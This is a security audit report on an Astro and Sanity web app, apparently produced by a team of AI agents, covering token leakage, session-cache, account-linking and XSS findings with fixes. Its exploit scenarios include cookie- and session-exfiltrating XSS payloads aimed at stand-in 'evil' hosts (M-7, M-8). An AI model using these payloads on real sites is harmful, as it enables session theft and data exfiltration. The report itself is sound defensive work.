# Security Audit — `astro-shadcn-sanity`

**Date:** 2026-04-30
**Branch:** `preview`
**Methodology:** Multi-agent parallel audit. A six-member Claude agent team (`security-audit-2026-04-30`) reviewed disjoint scopes in parallel; the lead aggregated, deduplicated, and spot-checked findings. Audit was read-only — no source files were modified.
**Confidence threshold:** Findings only included at confidence ≥ 8/10. False-positive filters applied: DoS / rate-limit, log spoofing, ReDoS, path-only SSRF, React safe-rendering, client-side auth gaps, doc files, test files, lack-of-hardening without concrete vuln.

## Executive summary

| Severity | Count |
|---|---|
| HIGH | **3** |
| MEDIUM | **9** |
| Total | **12** |

Top issue: **a Sanity Studio admin bearer token is baked into the deployed Studio JS bundle**, granting any visitor full read access to the sponsor-acceptances audit table (PII). Rotate the token before anything else.

The newer auth/portal API surface (Better Auth + middleware + portal routes) has several MEDIUM-severity defense-in-depth gaps around session caching, account linking, and trusted-origin reflection. The public `/api/subscribe` endpoint has unauthenticated state changes. JSON-LD blocks across all detail pages are vulnerable to XSS via Sanity-authored content. Cloudflare worker config and the broader script/action surface were clean.

### Scopes reviewed

| Auditor | Scope | Result |
|---|---|---|
| `portal-api-auditor` | `astro-app/src/pages/portal/api/**`, `astro-app/src/pages/api/portal/**` | Clean |
| `public-api-auditor` | `astro-app/src/pages/api/{subscribe,auth/[...all],events/[slug].ics}.ts` | 2 MEDIUM |
| `auth-core-auditor` | `auth-config.ts`, `auth-client.ts`, `db.ts`, `drizzle-schema.ts`, `middleware.ts`, `migrations/**` | 2 HIGH, 5 MEDIUM |
| `render-xss-auditor` | `layouts/**`, `pages/**/*.astro`, `components/{portal,portable-text,blocks}/**` | 2 MEDIUM |
| `sanity-auditor` | `studio/**`, `astro-app/src/lib/queries/**`, all `defineQuery`/`groq` usage | 1 HIGH (1 dup HIGH consolidated) |
| `cf-config-worker-auditor` | `wrangler.jsonc`, `astro.config.mjs`, `*-worker/`, `discord-bot/`, `platform-api/`, `scripts/**`, `astro-app/src/actions/**` | Clean |

---

## HIGH-severity findings

### H-1: Sanity Studio admin bearer token shipped in browser bundle
- **File:** `studio/src/tools/SponsorAcceptancesTool.tsx:50`
- **Bundle artifact:** `studio/dist/static/sanity-C9Hq28QJ.js` (literal `SANITY_STUDIO_ADMIN_TOKEN` substring confirmed)
- **Confidence:** 10
- **Description:** `readConfig()` reads `import.meta.env.SANITY_STUDIO_ADMIN_TOKEN`. Studio's Vite-style env convention inlines every `SANITY_STUDIO_*` variable into the client bundle (documented in `studio/.env.example:2`). The compiled JS shipped to every Studio user contains the literal token. Server-side validation in `astro-app/src/pages/api/portal/admin/acceptances.ts:79` uses `constantTimeEqual(token, env.STUDIO_ADMIN_TOKEN)` — but the constant-time compare doesn't help when the secret itself is public.
- **Exploit Scenario:** Anyone who can load the deployed Studio (or fetch the static JS bundle from `studioHost`) extracts the bearer with DevTools, then issues:
  ```
  GET https://ywcccapstone1.com/api/portal/admin/acceptances?accepted=all
    Authorization: Bearer <token>
    Origin: <STUDIO_ORIGIN>
  ```
  The CORS check at `acceptances.ts:73` only inspects the `Origin` header, which is forgeable in any non-browser HTTP client. The attacker exfiltrates every sponsor's email, name, role, agreement-acceptance timestamp, and pinned agreement version. Token has no scope or expiry.
- **Fix:**
  1. **Rotate `STUDIO_ADMIN_TOKEN` immediately** (and the matching value in `studio/.env`).
  2. Stop using `SANITY_STUDIO_*` for any secret. Either:
     - Have the Studio tool call the admin endpoint with cookie-based session auth + admin-role check on the server (Studio user identity), or
     - Move the bearer behind a Sanity Function / serverless backend that authorises the request via the Studio user's `identity()`.
  3. Re-deploy Studio so the next bundle no longer contains a secret. Verify with `curl <studio-url>/static/<bundle>.js | grep '^sat_'` returning empty.
- **Status: RESOLVED 2026-05-01 via Story 24.1.**
  - Identity path A chosen — server introspects the Studio user's session JWT via `https://<projectId>.api.sanity.io/v1/users/me` and authorizes only `administrator`-role users.
  - `studio/src/tools/SponsorAcceptancesTool.tsx` now reads `client.config().token` (per-user, short-lived) instead of `import.meta.env.SANITY_STUDIO_ADMIN_TOKEN`.
  - `STUDIO_ADMIN_TOKEN` removed from `astro:env` schema, `env.d.ts`, `studio/.env.example`, and all documentation. Token rotation + `wrangler secret delete STUDIO_ADMIN_TOKEN --env capstone` performed at deploy.
  - Bundle scrub guard (`studio/scripts/check-no-secrets.sh`, wired as `postbuild`) blocks `sat_*` literals and any reference to the retired env-var name from re-entering shipped JS.
  - `Origin === STUDIO_ORIGIN` check retained as defense-in-depth.

### H-2: Authentication-bypass surface via raw-token KV session cache
- **File:** `astro-app/src/middleware.ts:142-147` (read), `:178-181, :199-202` (write)
- **Confidence:** 9
- **Description:** The middleware uses the raw Better Auth session cookie value as the `SESSION_CACHE` KV key, then trusts the JSON payload as `{email, name, role}` without verifying the cookie's HMAC signature, validating `expiresAt`, or hashing the key. Better Auth's own `cookieCache` (already enabled at `auth-config.ts:157-163`) is signed; this bespoke KV cache regresses that property.
- **Exploit Scenario:** Two paths:
  1. **Post-revocation replay.** A user signs in legitimately; their cookie token `T` lives in KV with 300 s TTL, *re-extended on every authenticated request* (fire-and-forget put). When their Better Auth session is revoked or expires in D1, the KV cache continues to authenticate `T` until the TTL window finally lapses without any traffic.
  2. **KV-read → impersonation.** Anyone with read access to `SESSION_CACHE` (CF dashboard read-only role, leaked Wrangler creds, accidentally read-only-bound debug worker) can list keys and use any one as a bearer cookie to impersonate that user — no OAuth required, no signature check. KV keys are not secrets in CF's threat model; raw session tokens are.
- **Fix:** Use `SHA-256(token)` as the KV key, store `expiresAt` in the cached payload and check it on read, and invalidate on sign-out. Better: drop the bespoke cache and rely on Better Auth's signed `cookieCache`.

### H-3: Account-linking + magic-link signup enables sponsor role takeover
- **File:** `astro-app/src/lib/auth-config.ts:117-120` (account linking), `:122-137` (magic link), `:142-149` (`databaseHooks.user.create.before`)
- **Confidence:** 9
- **Description:** Three settings combine into a privilege-escalation chain:
  1. `account.accountLinking.allowDifferentEmails: true`
  2. `magicLink({ ... })` with **no `disableSignUp`** — magic links auto-create users
  3. `databaseHooks.user.create.before` calls `checkSponsorWhitelist(user.email)` and assigns `role: 'sponsor'` if the email matches any sponsor doc's `contactEmail` or `allowedEmails[]`
  Social providers (`google`, `github`) lack any `requireEmailVerification` gate at the Better Auth layer and will trust IdP-provided email even if the IdP didn't set `email_verified`.
- **Exploit Scenario:**
  - **Path A (magic link):** Attacker who has read access to a shared sponsor inbox (`info@sponsor.com` aliases on `allowedEmails`, briefly compromised forwarder, IMAP cred reuse) requests a magic link, clicks it, becomes a `sponsor`-role user. No password, no MFA, no admin approval.
  - **Path B (OAuth + linking):** Attacker registers a Google or GitHub account whose primary email is a sponsor's address (Google requires email verification; GitHub historically less strict on secondary emails when linked). Sign-in triggers `checkSponsorWhitelist` on the IdP-claimed email, granting sponsor role. With `allowDifferentEmails: true`, an existing low-priv user can also link a second provider whose primary email is a sponsor's, then on next session refresh the middleware's role-escalation path (`middleware.ts:195-209`) promotes them.
- **Fix:**
  - Set `magicLink({ disableSignUp: true })` so magic links can only sign in **existing** users; provision sponsors via an admin-invite flow.
  - Set `accountLinking.allowDifferentEmails: false`.
  - Require provider-verified email before assigning sponsor role (check `account.providerData.email_verified` in the create hook; reject if false).
  - Move sponsor whitelist authoritative check to admin-curated allowlist, not Studio-editable `allowedEmails[]` (see also M-4).

---

## MEDIUM-severity findings

### M-1: Unauthenticated `DELETE /api/subscribe` deactivates any subscriber
- **File:** `astro-app/src/pages/api/subscribe.ts:56-70`
- **Confidence:** 9
- **Description:** Accepts `email` from the query string and unconditionally `UPDATE subscribers SET active = 0 WHERE email = ?`. No session check, no signed unsubscribe token. Lives outside `/api/portal/*` so the auth middleware (`middleware.ts:71-80`) is not engaged.
- **Exploit Scenario:** Attacker scripts `DELETE /api/subscribe?email=victim@…` against harvested addresses to silently disable every subscriber's reminders. Victims discover the breakage only on a missed reminder.
- **Fix:** Require a per-subscriber random `unsubscribe_token` set at insert time, embed `?token=...&email=...` in outbound emails, and `constantTimeEqual` it before flipping `active = 0`.

### M-2: Unauthenticated `POST /api/subscribe` enables targeted reminder/discord forgery
- **File:** `astro-app/src/pages/api/subscribe.ts:11-54`
- **Confidence:** 8
- **Description:** Anyone can post `{email, discord_user_id}` and the row becomes immediately reminder-eligible. No proof of email ownership, no double-opt-in, attacker controls `discord_user_id`. The hourly counter is a global cap (10/hr across all subscribers) and is bypassed via `try {} catch {}` if the D1 read errors.
- **Exploit Scenario:** Attacker posts `{email:"victim@school.edu", discord_user_id:"<attacker_dm_target>", remind_days_before:1}`. Reminder worker emails the victim from the institutional `RESEND_FROM_EMAIL` sender, or DMs the attacker's Discord target — useful for spoofed-sender phishing.
- **Fix:** Confirm-by-email flow: insert with `active = 0` plus a confirmation token; only flip on token-link click. Bind `discord_user_id` only after Discord OAuth or bot challenge.

### M-3: Trusted-origin reflection and request-derived `baseURL` in Better Auth
- **File:** `astro-app/src/lib/auth-config.ts:79-85`
- **Confidence:** 8
- **Description:** `requestOrigin` is taken from `context.url.origin` (in turn derived from request `Host` header) and used as Better Auth's `baseURL`, then unconditionally added to `trustedOrigins`. CSRF / Origin protection becomes self-referential — every request implicitly trusts its own Origin. Production is somewhat protected by CF Routes locking `Host`, but `*.workers.dev` and any preview URL share the cookie domain in some configurations, and any non-browser client can attack the worker on `*.workers.dev` directly.
- **Exploit Scenario:** Attacker reaches the worker via its `*.workers.dev` URL with a forged `Host: attacker.example` and finds CSRF/Origin checks pass for the attacker-controlled origin (because that origin has just been added to `trustedOrigins`). On preview deployments, this is the standard surface.
- **Fix:** Static allowlist of trusted origins, derived from `CLOUDFLARE_ENV`. Never push request-derived values into `trustedOrigins`. `baseURL` from server config only.

### M-4: Sponsor whitelist via Studio-editable `allowedEmails[]`
- **File:** `astro-app/src/lib/auth-config.ts:31-33` (query); `studio/src/schemaTypes/documents/sponsor.ts:102` (schema field)
- **Confidence:** 8
- **Description:** GROQ matches `$email in allowedEmails[]`. If `allowedEmails` is editable by sponsor users in Studio (typical self-serve sponsor workflow), any sponsor can elevate arbitrary external users to sponsor role by editing their own document. There is no admin-approval gate.
- **Exploit Scenario:** Sponsor A appends `attacker@evil.example` to their sponsor doc's `allowedEmails`. Attacker signs up via Google/magic-link; `checkSponsorWhitelist` returns true; attacker is provisioned as a `sponsor` and gains portal access spanning evaluations, RSVPs, and the agreement audit table.
- **Fix:** Restrict `allowedEmails` write access at the Sanity role level (admin-only). Or add an `approved: boolean` controlled by an admin-only field. Or replace per-email allowlist with admin-managed domain allowlist.

### M-5: D1 `role` column lacks a CHECK constraint
- **File:** `astro-app/migrations/0002_add_user_role.sql:4`
- **Confidence:** 8
- **Description:** Migration adds `role TEXT DEFAULT 'student' NOT NULL` with no CHECK. The Drizzle enum (`drizzle-schema.ts:17`) is TypeScript-only — SQLite does not enforce it. Today the only writer is `middleware.ts:205-208` (parameterised, hard-coded `'sponsor'`), so this is defense-in-depth — but if a future endpoint ever takes `role` from a request body, the DB will silently accept anything.
- **Fix:** New migration that recreates `user` with `CHECK(role IN ('student','sponsor'))` (SQLite cannot ALTER COLUMN). Or a `CREATE TRIGGER` enforcing the invariant.

### M-6: Magic-link `expiresIn` default vs email copy
- **File:** `astro-app/src/lib/auth-config.ts:122-137`
- **Confidence:** 8
- **Description:** Email body says "This link expires in 10 minutes" but `magicLink({})` is configured with no `expiresIn` (Better Auth default is 5 min). UX/copy mismatch; combined with default `disableSignUp: false`, a user clicking after 5 min sees a confusing error. Pair with H-3 fix.
- **Fix:** `magicLink({ disableSignUp: true, expiresIn: 600 })` (or shorten the copy).

### M-7: XSS via `set:html` on JSON-LD scripts (~14 files)
- **Files:** `astro-app/src/pages/sponsors/[slug].astro:64`, plus identical pattern in:
  `pages/authors/[slug].astro:67`, `pages/authors/index.astro:32`, `pages/articles/[slug].astro:94`, `pages/articles/index.astro:55`, `pages/articles/category/[slug].astro:75`, `pages/sponsors/index.astro:33`, `pages/projects/[slug].astro:66`, `pages/projects/index.astro:39`, `pages/events/[slug].astro:90`, `pages/events/index.astro:34`, `pages/gallery/index.astro:39`, `pages/portal/events.astro:40`, `pages/portal/progress.astro:169`, and the fallback at `layouts/Layout.astro:122`.
- **Confidence:** 9
- **Description:** Pattern `<script type="application/ld+json" set:html={JSON.stringify(pageGraph)} />` interpolates Sanity-authored fields (sponsor name/description, article headline/excerpt, author name/bio, breadcrumb labels, siteSettings.siteName) into an inline script. `JSON.stringify` does **not** escape `<`, `>`, or `/`, so the substring `</script>` placed inside any field terminates the inline script tag at parse time and what follows is interpreted as HTML. CSP at `layouts/Layout.astro:84` is `script-src 'self' 'unsafe-inline'` (no nonce), so injected inline scripts execute.
- **Exploit Scenario:** A Sanity editor (intentional, social-engineered, or via stolen credentials) sets sponsor `name` to `Acme</script><script>fetch('//evil/'+document.cookie)</script>`. Every visitor's browser exfiltrates auth/session cookies (incl. portal Better-Auth session for any logged-in sponsor or admin viewing the page).
- **Fix:** Escape JSON for safe inline embedding before injection: `JSON.stringify(graph).replace(/</g,'\\u003c').replace(/>/g,'\\u003e').replace(/&/g,'\\u0026').replace(/ /g,'\\u2028').replace(/ /g,'\\u2029')`. Best implemented as a single `<JsonLd schema={...} />` component used everywhere. Even better: drop `'unsafe-inline'`, adopt nonces (Astro 5+ experimental CSP feature).

### M-8: Stored XSS via Sanity-authored `EmbedBlock.rawEmbedCode`
- **Files:** `astro-app/src/components/blocks/custom/EmbedBlock.astro:38, 75, 112`; schema `studio/src/schemaTypes/blocks/embed-block.ts:32`
- **Confidence:** 9
- **Description:** `cleanRawEmbedCode` is a `stegaClean()`'d Sanity `rawEmbedCode` string rendered via `<Fragment set:html={cleanRawEmbedCode} />`. `stegaClean` does **not** sanitise HTML. Schema only has a "trusted sources" warning text, no technical control. The block is exposed in many page-builder slots (per `schema.json` references in pages).
- **Exploit Scenario:** Any editor account inserts an Embed Block containing `<script>fetch('/portal/api/me').then(r=>r.json()).then(d=>navigator.sendBeacon('https://evil/x',JSON.stringify(d)))</script>`. As soon as a logged-in sponsor or admin views the page, their session/PII is exfiltrated. Same vector also reachable through `iframe.src` (line 23/43) which accepts any `http(s)` URL — sandbox flags allow `same-origin allow-scripts`.
- **Fix:** Sanitise with `isomorphic-dompurify` allowing only an explicit tag/attribute set, OR render every embed inside a sandboxed `<iframe srcdoc="...">` so it executes in an opaque origin without first-party cookie access. Also restrict `embedUrl` to an allow-list of providers (YouTube, Vimeo, Google Maps).

### M-9: `auth-config.ts:81` — `requestOrigin` reflected into `baseURL`
Bundled into M-3 above (same root cause; itemised here for reviewer ergonomics — single fix covers both).

---

## Clean scopes (no findings)

### Portal API routes (`astro-app/src/pages/portal/api/**`, `astro-app/src/pages/api/portal/**`)
All routes gated by middleware (session + role + sponsor whitelist + agreement acceptance). Drizzle queries scoped to authenticated email. GROQ uses `loadQuery` with parameter binding. `/portal/api/projects.ts` enforces `sponsor._id !== sponsorId → 403`. `/portal/api/github/repos.ts` calls only the static `https://api.github.com/user/repos` URL with the user's stored token. `/api/portal/admin/acceptances.ts` server-side: bearer + origin check + `constantTimeEqual` + parameterised SQL (the bearer leak is on the *client* side — see H-1).

### Cloudflare config / workers / scripts / actions
`wrangler.jsonc` exposes only public IDs (CF account/project, OAuth client IDs, Turnstile *site* keys, KV/D1 namespace IDs, public Sanity project ID). No previously-enforced compat flag was removed; `nodejs_compat` + `global_fetch_strictly_public` retained. Discord interactions endpoint verifies Ed25519 signatures with a 300 s timestamp window before parsing. Astro action `submitForm` server-verifies Turnstile and writes via parameterised Sanity create. `platform-api` CORS uses an explicit origin allowlist (no `*` + credentials). All in-scope GROQ in `platform-api` uses parameter binding. Build-time scripts are local-only and have no untrusted-input source.

---

## References

**Astro docs (`mcp__astro-docs__search_astro_docs`):**
- `compressHTML` / `set:html`: Astro emits the directive's value verbatim into the HTML stream — there is no built-in sanitisation.
- Environment variables: only `PUBLIC_`-prefixed vars are exposed to client code. Repo correctly gates server secrets (only `PUBLIC_*` referenced from layouts/components).
- Middleware/redirect: `Astro.redirect()` performs no validation of redirect targets. The repo's `safeRedirect()` (`pages/auth/login.astro:13`, `pages/portal/login.astro:17`) requires `/`-prefix and rejects `//` schemeless URLs — solid open-redirect mitigation.

**Sanity docs / rules (`mcp__plugin_sanity-plugin_Sanity__*`):**
- GROQ rule: "Use `$params` not interpolation — prevents query manipulation + enables caching."
- *GROQ parameters* spec: parameters are JSON literals containing values only, "safe to pass from user input."
- Astro rule §2: `defineQuery` + `sanityClient.fetch(QUERY, params)` from server-side.
- Studio convention (`studio/.env.example:2`): `SANITY_STUDIO_*` env vars are exposed to the client bundle by design — secrets must use a different prefix and a different transport (this directly contradicts H-1's pattern).

**Better Auth best practices (skill):**
- `accountLinking.allowDifferentEmails` and magic-link `disableSignUp: false` are documented foot-guns.
- `cookieCache` is HMAC-signed; bespoke external caches should hash the token and store an `expiresAt`.
- `trustedOrigins` should be a static allowlist, never request-reflective.

---

## Recommended remediation order

1. [x] **H-1** — rotate `STUDIO_ADMIN_TOKEN`; refactor `SponsorAcceptancesTool` to authenticate via Studio user identity rather than a shared bearer. (Highest blast radius, simplest fix.) **RESOLVED 2026-05-01 via Story 24.1.**
2. **H-3** — set `disableSignUp: true` on magic link, `allowDifferentEmails: false` on account linking. One-line config changes.
3. **M-1, M-2** — add unsubscribe token + double-opt-in to `/api/subscribe`. New random column + email flow.
4. **M-7, M-8** — introduce `<JsonLd>` component with proper escaping; sandbox or DOMPurify the `EmbedBlock`.
5. **H-2** — switch `SESSION_CACHE` to hashed keys + stored `expiresAt`, or remove and rely on Better Auth `cookieCache`.
6. **M-3** — replace request-reflective `trustedOrigins`/`baseURL` with `CLOUDFLARE_ENV`-driven static allowlist.
7. **M-4** — restrict who can edit `sponsor.allowedEmails` in Studio.
8. **M-5, M-6** — DB `CHECK` constraint, magic-link `expiresIn`. Hygiene.
